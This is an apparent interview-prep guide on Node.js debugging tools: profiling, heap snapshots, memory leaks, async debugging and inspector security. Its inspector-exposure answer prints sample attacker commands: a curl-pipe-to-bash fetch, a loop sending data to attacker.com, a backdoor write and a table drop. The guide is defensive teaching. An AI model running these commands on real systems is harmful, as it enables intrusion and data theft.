# Interview Questions: Runtime Debugging Tools

## Question 1: CPU Profiling - Understanding Sampling

**Question**: You run a CPU profiler on your Node.js application for 10 seconds. The profiler shows that `calculateTotal()` consumed 40% of CPU time. Does this mean `calculateTotal()` ran for exactly 4 seconds? Why or why not?

```javascript
function calculateTotal(items) {
  let sum = 0;
  for (let item of items) {
    sum += item.price * item.quantity;
  }
  return sum;
}

// Profiler shows: calculateTotal: 40% (200 samples out of 500 total)
```

<details>
<summary>Answer</summary>

**No**, it doesn't mean exactly 4 seconds. Here's why:

**How CPU Profiler Works**:
- Uses **sampling**, not exact measurement
- Samples call stack every ~1ms (default)  
- 500 total samples over 10 seconds
- `calculateTotal` appeared in 200 samples

**What 40% Actually Means**:
- When profiler sampled, `calculateTotal` was on the call stack 40% of the time
- **Statistical approximation**, not exact timing
- Could be 3.5s to 4.5s in reality

**Why It's Not Exact**:

1. **Sampling Interval**:
   - Samples every ~1ms
   - Might miss very fast executions
   - Might over-sample long loops

2. **Sampling Bias**:
   - If function runs for 0.5ms, might be captured 0 or 1 times
   - Statistical noise for short-lived functions

3. **Resolution Limit**:
   - Can't measure below sampling interval
   - Very fast functions (<1ms) may not appear at all

**Example Demonstrating Uncertainty**:

```javascript
// Function A: Runs for exactly 1.5ms
function fastFunction() { /* 1.5ms work */ }

// Sampling at 1ms:
// - Sample at 0ms: Miss
// - Sample at 1ms: Hit
// - Sample at 2ms: Miss

// Result: 1 sample captured
// Reported: 1ms (not actual 1.5ms)
```

**Interview Insight**: Strong candidates explain sampling-based profiling and statistical nature. They understand the trade-off: low overhead vs. exact precision.

**Follow-up**: "When would sampling fail to show a problematic function?"

**Answer**: Very fast functions (<1ms) called many times. They might not appear hot in sampling, but aggregate time could be significant. Solution: Use instrumentation-based profiling or count invocations separately.

</details>

---

## Question 2: Heap Snapshot Production Incident

**Question**: Your production server has 4GB RAM and Node.js heap limit of 3GB. Current heap usage is 2.8GB (93% full). You suspect a memory leak and decide to take a heap snapshot. What happens? How would you handle this safely?

```javascript
// Production server
process.memoryUsage().heapUsed: 2.8GB
process.memoryUsage().heapTotal: 3GB
process.memoryUsage().rss: 3.2GB (includes native memory)

// You run:
v8.writeHeapSnapshot();
```

<details>
<summary>Answer</summary>

**What Happens**: 
The process **crashes with OOM** (Out of Memory) error.

**Why It Crashes**:

1. **Heap Snapshot Process**:
   - V8 must create a **copy** of the heap to serialize
   - Temporarily **doubles memory usage**
   - 2.8GB heap → ~5.6GB needed during snapshot

2. **Memory Limit Exceeded**:
   - Heap limit: 3GB
   - Current: 2.8GB
   - Snapshot needs: +2.8GB
   - Total required: 5.6GB > 3GB limit
   - Result: **OOM crash**

3. **Additional Costs**:
   - V8 triggers **full GC** before snapshot
   - Metadata structures for snapshot
   - File I/O buffers

**Production Impact**:
```
Timeline:
T0: Execute v8.writeHeapSnapshot()
T1: V8 triggers full GC (500ms pause)
T2: Begin heap duplication
T3: Memory exceeds limit
T4: OOM exception thrown
T5: Process crashes (unhandled)
T6: All in-flight requests fail
T7: Users see 502 Bad Gateway
```

**Safe Alternatives**:

**Option 1: Heap Sampling (Best for Production)**

```javascript
const { Session } = require('inspector');
const session = new Session();
session.connect();

// Low overhead, no memory spike
session.post('HeapProfiler.startSampling', { samplingInterval: 512 }, () => {
  setTimeout(() => {
    session.post('HeapProfiler.stopSampling', (err, { profile }) => {
      fs.writeFileSync('heap-sample.heapprofile', JSON.stringify(profile));
      session.disconnect();
    });
  }, 60000); // Sample for 1 minute
});
```

**Option 2: Process Memory Check First**

```javascript
function safeHeapSnapshot() {
  const mem = process.memoryUsage();
  const heapUsed = mem.heapUsed;
  const heapTotal = mem.heapTotal;
  const available = heapTotal - heapUsed;
  
  // Need at least heapUsed * 1.5 available for safety
  const required = heapUsed * 1.5;
  
  if (available < required) {
    console.error('Insufficient memory for snapshot');
    console.error(`  Used: ${(heapUsed / 1024 / 1024).toFixed(2)} MB`);
    console.error(`  Need: ${(required / 1024 / 1024).toFixed(2)} MB`);
    console.error(`  Available: ${(available / 1024 / 1024).toFixed(2)} MB`);
    return false;
  }
  
  return v8.writeHeapSnapshot();
}
```

**Option 3: Temporary Heap Limit Increase**

```bash
# Restart with higher limit temporarily
node --max-old-space-size=6144 app.js

# Take snapshot
# Then restart with normal limit
```

**Option 4: Snapshot on Separate Instance**

```bash
# Don't snapshot production instance
# Instead:
# 1. Clone instance with higher memory
# 2. Route traffic away
# 3. Take snapshot on clone
# 4. Analyze
# 5. Apply fix to production
```

**Best Practice for Production**:

```javascript
class SafeDebugger {
  canTakeSnapshot() {
    const mem = process.memoryUsage();
    const usagePercent = (mem.heapUsed / mem.heapTotal) * 100;
    
    // Only allow if heap < 60% full
    return usagePercent < 60;
  }
  
  takeSnapshot() {
    if (!this.canTakeSnapshot()) {
      console.error('Heap too full for safe snapshot');
      console.error('Use heap sampling instead');
      return this.startHeapSampling();
    }
    
    return v8.writeHeapSnapshot();
  }
  
  startHeapSampling() {
    // Use sampling - safe at any heap usage
  }
}
```

**Interview Insight**: This tests understanding of:
- Heap snapshot memory overhead
- Production safety
- Alternative debugging approaches
- When to use which tool

**Red Flag Answer**: "Just take the snapshot, it'll work fine"

**Strong Answer**: Explains memory doubling, suggests heap sampling for production, mentions memory checks before snapshot.

</details>

---

## Question 3: Inspector Security Vulnerability

**Question**: A developer deploys a Node.js microservice to production with this command:

```bash
node --inspect=0.0.0.0:9229 app.js
```

The application is deployed on a cloud VM with a public IP. What security vulnerabilities does this introduce? What can an attacker do?

<details>
<summary>Answer</summary>

**Critical Vulnerability**: Inspector is **exposed to the internet** without authentication.

**What An Attacker Can Do**:

**1. Read All Memory**
```
- Access all variables, objects, closures
- Extract API keys, database passwords
- Steal user data, PII, session tokens
- Read environment variables
```

**2. Execute Arbitrary Code**
```javascript
// Via DevTools Console, attacker can run:
require('fs').writeFileSync('/tmp/backdoor.js', maliciousCode);
require('child_process').exec('curl attacker.com/malware.sh | bash');
process.exit(1); // Crash the service
```

**3. Modify Application State**
```javascript
// Via DevTools Console:
global.isAdmin = true;
global.users.forEach(u => u.balance = 0);
database.query('DROP TABLE users');
```

**4. Denial of Service**
```javascript
// Set breakpoint on every request
// All requests hang indefinitely
// No CPU usage, appears healthy to monitoring
```

**5. Data Exfiltration**
```javascript
// Continuously read and send data
setInterval(() => {
  const data = getCriticalData();
  fetch('http://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
}, 1000);
```

**Real-World Attack Scenario**:

```
Day 1: Attacker scans for open port 9229
       → Finds your exposed inspector

Day 2: Connects via Chrome DevTools
       → Browses memory
       → Finds: process.env.DATABASE_URL
       → Extracts credentials

Day 3: Connects to your database
       → Exfiltrates user data
       → Leaves backdoor for persistence

Day 4: You discover breach via logs
       → Too late, data already stolen
```

**How to Detect**:

```bash
# Port scan shows 9229 open
nmap -p 9229 your-production-server.com

# Netstat shows WebSocket connections
netstat -an | grep 9229
tcp   0   0 0.0.0.0:9229   0.0.0.0:*   LISTEN
```

**Proper Configuration**:

**✅ GOOD: Localhost only**
```bash
node --inspect=127.0.0.1:9229 app.js
# Only accessible from same machine
```

**✅ GOOD: Not enabled by default**
```bash
node app.js
# Enable dynamically when needed:
kill -USR1 <pid>
```

**✅ GOOD: SSH tunnel for remote debugging**
```bash
# On production server:
node --inspect=127.0.0.1:9229 app.js

# On your local machine:
ssh -L 9229:localhost:9229 user@production-server

# Then connect to localhost:9229
# Traffic encrypted via SSH
```

**Defense in Depth**:

```javascript
// Conditional inspector enabling
if (process.env.NODE_ENV !== 'production') {
  // Only enable in dev/staging
  inspector.open(9229, '127.0.0.1');
}

// Production: Signal-based with IP check
process.on('SIGUSR1', () => {
  const allowedIPs = ['127.0.0.1'];
  // Check source IP, only enable if localhost
  inspector.open(9229, '127.0.0.1');
  
  // Auto-disable after 5 minutes
  setTimeout(() => {
    inspector.close();
  }, 300000);
});
```

**Firewall Rules**:

```bash
# Block port 9229 from external access
iptables -A INPUT -p tcp --dport 9229 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 9229 -j DROP
```

**Interview Insight**: This tests security awareness and understanding of:
- Network exposure risks
- Inspector capabilities
- Production deployment practices
- Defense in depth

**Red Flag**: "It's fine, we have authentication in the app"  
(Inspector bypasses all app-level auth)

**Strong Answer**: Explains full attack surface, mentions proper binding to localhost, SSH tunnels, and principle of least privilege.

</details>

---

## Question 4: Heap Snapshot Analysis - Find the Leak

**Question**: You take two heap snapshots 5 minutes apart. The comparison shows:

```
Snapshot 1: 250 MB heap
Snapshot 2: 550 MB heap (+300 MB growth)

Object growth:
- Array: +15,000 instances (+200 MB)
- Object: +5,000 instances (+50 MB)  
- String: +100,000 instances (+50 MB)

Retainers for largest Array:
(global) → leakyCache → Array[15000] → Object → data
```

Where is the memory leak likely located? How would you confirm and fix it?

<details>
<summary>Answer</summary>

**Leak Location**: The `leakyCache` global variable.

**Analysis**:

**1. Identify Growing Objects**
- Arrays grew by 15,000 instances (+200 MB)
- Largest memory contributor
- Consistent growth suggests accumulation

**2. Check Retainer Chain**
```
(global) → leakyCache → Array[15000] → Object → data
```

This tells us:
- `leakyCache` is a **global variable**
- It holds an **array with 15,000 elements**
- Each element is an **Object containing data**
- Nothing else references these objects
- **Root cause**: Global cache never evicts old entries

**3. Why It's a Leak**

```javascript
// Likely code pattern:
global.leakyCache = [];

function storeData(result) {
  global.leakyCache.push({
    timestamp: Date.now(),
    data: result // Possibly large
  });
  
  // BUG: No eviction policy!
  // Cache grows indefinitely
}
```

**How to Confirm**:

**Method 1: Search for leakyCache in Code**
```bash
grep -r "leakyCache" src/
# Find where it's populated
# Check if there's eviction logic
```

**Method 2: Inspect Object Contents in DevTools**
```
1. Load snapshot in Chrome DevTools
2. Search for "leakyCache"
3. Expand the array
4. Look at timestamps of objects
5. If timestamps span hours/days → leak confirmed
```

**Method 3: Check Memory Retention**
```javascript
// In production console (if inspector enabled)
console.log(global.leakyCache.length); // 15000
console.log(global.leakyCache[0].timestamp); // Hours ago
console.log(global.leakyCache[14999].timestamp); // Recent

// Old entries never removed → leak
```

**How to Fix**:

**Fix 1: Add Eviction Policy (Max Size)**

```javascript
const MAX_CACHE_SIZE = 1000;

function storeData(result) {
  global.leakyCache.push({
    timestamp: Date.now(),
    data: result
  });
  
  // Evict oldest when limit exceeded
  if (global.leakyCache.length > MAX_CACHE_SIZE) {
    global.leakyCache.shift(); // Remove oldest
  }
}
```

**Fix 2: Time-Based Eviction (TTL)**

```javascript
const CACHE_TTL = 3600000; // 1 hour

function storeData(result) {
  const now = Date.now();
  
  global.leakyCache.push({
    timestamp: now,
    data: result
  });
  
  // Remove entries older than TTL
  global.leakyCache = global.leakyCache.filter(
    item => (now - item.timestamp) < CACHE_TTL
  );
}
```

**Fix 3: Use Proper Cache Library**

```javascript
const LRU = require('lru-cache');

// Replace global array with LRU cache
global.leakyCache = new LRU({
  max: 1000, // Max entries
  maxAge: 3600000, // 1 hour TTL
  updateAgeOnGet: true
});

function storeData(key, result) {
  global.leakyCache.set(key, {
    timestamp: Date.now(),
    data: result
  });
  // LRU automatically evicts old entries
}
```

**Fix 4: Don't Use Global (Best)**

```javascript
// Instead of global cache, use local scope
class DataService {
  constructor() {
    this.cache = new LRU({ max: 1000 });
  }
  
  storeData(key, result) {
    this.cache.set(key, result);
  }
}

// Cache is scoped to instance, not global
```

**Verification After Fix**:

```javascript
// Monitor cache size
setInterval(() => {
  console.log('Cache size:', global.leakyCache.length);
  const mem = process.memoryUsage();
  console.log('Heap used:', (mem.heapUsed / 1024 / 1024).toFixed(2), 'MB');
}, 60000);

// Expect:
// - Cache size stays bounded
// - Heap usage stabilizes
// - No continuous growth
```

**Take Another Snapshot After 5 Minutes**:
```
Snapshot 3: Should be similar to Snapshot 2
- If still growing → leak not fixed
- If stable → leak fixed
```

**Interview Insight**: This tests:
- Heap snapshot analysis skills
- Understanding retainer chains
- Root cause identification
- Knowledge of caching best practices

**Red Flag**: "Just increase heap limit" (doesn't fix leak, just delays crash)

**Strong Answer**: Explains retainer chain, identifies global cache issue, suggests LRU cache with eviction policy, describes verification approach.

</details>

---

## Question 5: The "Why" Question - Sampling vs Instrumentation

**Question**: Why does Node.js use sampling-based CPU profiling by default instead of instrumentation-based profiling? What would break if every function call was instrumented with timing logic?

<details>
<summary>Answer</summary>

**Why Sampling is Default**:

**1. Low Overhead**
- Sampling: ~1-2% overhead
- Instrumentation: 10-100%+ overhead
- Production-safe vs. Development-only

**2. Minimal Code Modification**
- Sampling: No code changes needed
- Instrumentation: Must inject timing code into every function

**What Would Break with Instrumentation**:

**Problem 1: Observer Effect (Performance Distortion)**

```javascript
// Original function
function processingItem(item) {
  return item * 2; // Fast: ~0.001ms
}

// Instrumented version
function processItem(item) {
  const start = performance.now(); // Overhead!
  const result = item * 2;
  const end = performance.now(); // Overhead!
  recordTiming('processItem', end - start); // Overhead!
  return result;
}

// Timing overhead: ~0.01ms
// Original work: ~0.001ms
// Overhead is 10x the actual work!
// Profiler shows fake slowness
```

**Problem 2: Function Call Explosion**

```javascript
// Profile a loop calling fast function
for (let i = 0; i < 1000000; i++) {
  processItem(i); // 1M instrumented calls
}

// Each call:
// 1. Start timer
// 2. Do work
// 3. End timer
// 4. Record timing
// 5. Update aggregates

// Total overhead: 1M * 0.01ms = 10 seconds
// Actual work: 1M * 0.001ms = 1 second
// Performance degradation: 10x slower
```

**Problem 3: Memory Exhaustion**

```javascript
// Instrumentation must store timing data
const timings = {
  processItem: [0.001, 0.001, 0.001, ...], // 1M entries!
  otherFunction: [...],
  // Thousands of functions
};

// Memory usage: 1M calls * 8 bytes (double) * 1000 functions
// = 8 GB of timing data
// OOM crash
```

**Problem 4: Inline Optimization Break**

```javascript
// V8 can inline this
function add(a, b) {
  return a + b;
}

function calculate(x) {
  return add(x, 5); // V8 inlines this
}

// After instrumentation:
function add(a, b) {
  startTimer('add'); // Prevents inlining!
  const result = a + b;
  endTimer('add');
  return result;
}

// V8 can't inline instrumented functions
// Loss of critical optimization
// Everything runs slower
```

**Problem 5: Event Loop Starvation**

```javascript
// Synchronous instrumentation
function processRequest(req) {
  startTimer('processRequest');
  
  // 1000 function calls
  // Each with timing overhead
  for (let i = 0; i < 1000; i++) {
    tracedFunction(); // Overhead!
  }
  
  endTimer('processRequest');
  recordResults(); // Blocks event loop!
}

// Instrumentation overhead blocks event loop
// Other requests starve
// Throughput collapses
```

**How Sampling Avoids These Issues**:

**Sampling Approach**:
```
Every 1ms:
  1. Interrupt execution (low cost)
  2. Capture call stack (fast)
  3. Resume immediately
  
After profiling:
  4. Aggregate samples (offline)
```

**Overhead Comparison**:

| Aspect | Sampling | Instrumentation |
|--------|----------|----------------|
| Overhead | 1-2% | 10-100%+ |
| Code changes | None | Every function |
| Memory usage | Small | Large (all timings) |
| Fast functions | May miss | Always captured |
| Inline optimization | Preserved | Broken |
| Production-safe | ✅ Yes | ❌ No |

**When to Use Each**:

**Sampling** (Default):
```javascript
// Production profiling
// Long-running analysis
// Low overhead critical
// Statistical accuracy acceptable
```

**Instrumentation**:
```javascript
// Development only
// Need exact call counts
// Need exact timing per call
// Willing to accept overhead

// Example:
const traced = require('traced-functions');
traced.enable();
// Everything runs 10x slower, but exact
```

**Modern Hybrid Approaches**:

Some profilers use **adaptive instrumentation**:
```
1. Start with sampling
2. Identify hot functions
3. Instrument ONLY hot functions
4. Best of both worlds
```

**Interview Insight**: This is a senior+ question testing:
- Understanding of profiling trade-offs
- Knowledge of V8 optimizations
- Systems-level thinking
- Production vs. development tools

**Red Flag**: "Instrumentation would give exact numbers, no downside"

**Strong Answer**: Explains overhead multiplication, observer effect, memory costs, inline optimization impact, and why sampling is production-safe.

</details>

---

## Question 6: Debugging Async Code

**Question**: You set a breakpoint in this async function, but when you inspect `result` in the debugger, it shows `undefined`. Why? How would you debug the actual value?

```javascript
async function fetchUserData(userId) {
  console.log('Fetching user:', userId);
  
  const result = await database.query('SELECT * FROM users WHERE id = ?', userId);
  
  debugger; // Breakpoint here
  
  console.log('Result:', result);
  return result;
}
```

<details>
<summary>Answer</summary>

**This is a trick question!** The `result` variable should NOT be `undefined` at the debugger statement, because `await` pauses execution until the promise resolves.

**If `result` IS `undefined`, possible causes:**

**Cause 1: Database Query Returned Undefined**

```javascript
// database.query() might be buggy
async function query(sql, param) {
  // Bug: forgot to return
  db.execute(sql, [param]);
  // Implicitly returns undefined
}

// Fix:
async function query(sql, param) {
  return db.execute(sql, [param]); // Return promise
}
```

**Cause 2: Inspecting in Wrong Context**

```javascript
// If you inspect `result` BEFORE await completes:
const result = await database.query(...);
// ^ If you pause HERE (before await resolves)
// result is undefined (promise hasn't resolved)

// But the debugger statement is AFTER await
// So this isn't the issue in the original code
```

**Cause 3: Optimized Away**

```javascript
// If running in production mode with optimizations
// V8 might optimize away unused variables

// To debug optimized code:
node --no-turbo-fan --no-opt app.js
// Disables optimizations, makes all variables visible
```

**Proper Async Debugging Techniques**:

**Technique 1: Async Stack Traces**

```javascript
// Enable in Chrome DevTools:
// Settings > Experiments > "Capture async stack traces"

async function fetchUserData(userId) {
  const result = await database.query('SELECT * FROM users WHERE id = ?', userId);
  debugger; // Can see full async call chain
  return result;
}

// Call stack shows:
// fetchUserData (line 4)
//   ← await
// handleRequest (caller)
//   ← Promise.then
// express middleware
```

**Technique 2: Conditional Breakpoints**

```javascript
async function fetchUserData(userId) {
  const result = await database.query('SELECT * FROM users WHERE id = ?', userId);
  
  // Conditional breakpoint: only pause if result is undefined
  // In DevTools: Right-click line > Add conditional breakpoint
  // Condition: result === undefined
  
  return result;
}
```

**Technique 3: Log & Profile**

```javascript
async function fetchUserData(userId) {
  console.log('Before query:', userId);
  
  const start = Date.now();
  const result = await database.query('SELECT * FROM users WHERE id = ?', userId);
  const duration = Date.now() - start;
  
  console.log('After query:', {
    userId,
    resultType: typeof result,
    resultKeys: result ? Object.keys(result) : null,
    duration
  });
  
  return result;
}
```

**Technique 4: Async Context Tracking**

```javascript
const { AsyncLocalStorage } = require('async_hooks');
const asyncContext = new AsyncLocalStorage();

async function fetchUserData(userId) {
  return asyncContext.run({ userId }, async () => {
    const result = await database.query('SELECT * FROM users WHERE id = ?', userId);
    
    // Can access context anywhere in async chain
    const context = asyncContext.getStore();
    console.log('Context:', context); // { userId: 123 }
    
    return result;
  });
}
```

**Common Async Debugging Traps**:

**Trap 1: Unhandled Rejection**

```javascript
async function fetchUserData(userId) {
  const result = await database.query(...);
  // If query throws, result never assigned
  // Unhandled rejection crashes app
}

// Fix: Add error handling
async function fetchUserData(userId) {
  try {
    const result = await database.query(...);
    return result;
  } catch (err) {
    console.error('Query failed:', err);
    throw err; // Re-throw or handle
  }
}
```

**Trap 2: Lost Context in Callbacks**

```javascript
async function processItems(items) {
  items.forEach(async (item) => {
    // BUG: forEach doesn't await
    await processItem(item);
  });
  
  console.log('Done'); // Prints before items processed!
}

// Fix:
async function processItems(items) {
  for (const item of items) {
    await processItem(item);
  }
  console.log('Done'); // Now correct
}
```

**Interview Insight**: Tests understanding of:
- Async/await execution model
- Debugger variable inspection
- V8 optimization impact on debugging
- Async debugging techniques

**Strong Answer**: Questions the premise (result shouldn't be undefined), explains possible causes, demonstrates async debugging techniques.

</details>

---

## Bonus: Production Debugging Scenario

**Question**: A production microservice suddenly starts using 95% CPU. You don't have any profiling enabled. How would you debug this without restarting the service?

<details>
<summary>Answer</summary>

**Step-by-Step Debugging**:

**Step 1: Enable Inspector (No Restart)**

```bash
# Get process PID
ps aux | grep node

# Send SIGUSR1 to enable inspector
kill -USR1 <PID>

# Inspector now available on localhost:9229
```

**Step 2: Connect from Local Machine**

```bash
# SSH tunnel to production
ssh -L 9229:localhost:9229 user@production-server

# Now connect Chrome DevTools to localhost:9229
```

**Step 3: Take CPU Profile Immediately**

```javascript
// Via DevTools Console:
const session = new (require('inspector').Session)();
session.connect();

session.post('Profiler.enable');
session.post('Profiler.start');

// Run for 30 seconds
setTimeout(() => {
  session.post('Profiler.stop', (err, { profile }) => {
    require('fs').writeFileSync('/tmp/cpu-profile.json', JSON.stringify(profile));
    console.log('Profile saved to /tmp/cpu-profile.json');
    session.disconnect();
  });
}, 30000);
```

**Step 4: Download and Analyze**

```bash
# Download profile
scp user@production-server:/tmp/cpu-profile.json ./

# Open in Chrome DevTools
# Performance > Load Profile
```

**Step 5: Identify Hot Function**

```
Profile shows:
  badRegex: 85% CPU (hot!)
    ← validateInput
    ← handleRequest
```

**Step 6: Inspect Live Code (If Needed)**

```javascript
// Via DevTools Console:
// Set breakpoint to inspect values
debugger;

// Or log current state
console.log('Current requests:', global.requestQueue);
```

**Step 7: Quick Mitigation**

```javascript
// Via DevTools Console:
// Temporarily disable problematic feature
global.featureFlags.regexValidation = false;

// Or rate limit
global.maxRequestsPerSecond = 10;
```

**Step 8: Permanent Fix**

```javascript
// Found issue in code:
function validateInput(input) {
  // BUG: Catastrophic backtracking
  const regex = /(a+)+b/;
  return regex.test(input);
}

// Fix: Use simpler regex or timeout
function validateInput(input) {
  const regex = /a+b/; // Non-catastrophic
  return regex.test(input);
}
```

**Alternative: If Inspector Can't Be Enabled**

**Use System Tools**:

```bash
# perf (Linux)
perf record -F 99 -p <PID> -g -- sleep 30
perf script > perf.out
# Generate flamegraph

# strace (system calls)
strace -c -p <PID>

# pmap (memory map)
pmap <PID>
```

**Interview Insight**: Strong candidates:
1. Know how to enable inspector on running process
2. Understand SSH tunneling for remote access
3. Can take CPU profile programmatically
4. Mention quick mitigation options
5. Consider system-level tools as fallback

</details>

---

## Summary: Key Interview Topics

**Must Know**:
1. Sampling vs. instrumentation trade-offs
2. Heap snapshot memory overhead (doubles heap)
3. Inspector security (localhost binding)
4. CPU profiler is statistical, not exact
5. SIGUSR1 enables inspector on running process

**Senior Level**:
1. When each tool is appropriate (production safety)
2. Memory impact of debugging tools
3. Async debugging techniques
4. Production debugging without restart
5. System-level profiling as fallback

**Red Flags** (Bad Answers):
- "Profiling has no overhead"
- "Take heap snapshots in production"
- "Expose inspector to network for convenience"
- "CPU profiler shows exact times"
